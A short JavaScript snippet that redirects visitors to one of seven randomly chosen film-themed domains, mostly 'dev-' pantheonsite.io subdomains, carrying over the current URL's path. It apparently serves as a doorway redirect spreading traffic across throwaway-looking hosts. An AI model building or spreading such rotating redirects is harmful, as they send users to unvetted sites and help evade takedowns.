var urlmain = document.URL;
var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
var dataUrl = [
"https://dev-filmflixss.pantheonsite.io/",
"https://dev-filmfj.pantheonsite.io/",	
"https://dev-neomoviefj.pantheonsite.io/",	
"https://filmnewfj.blogspot.com/",	
"https://dev-filmk32hd.pantheonsite.io/",
"https://dev-neoflimfj.pantheonsite.io/",	
"https://dev-neofilmfj.pantheonsite.io/"
];
var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
window.location = randomItem + param;
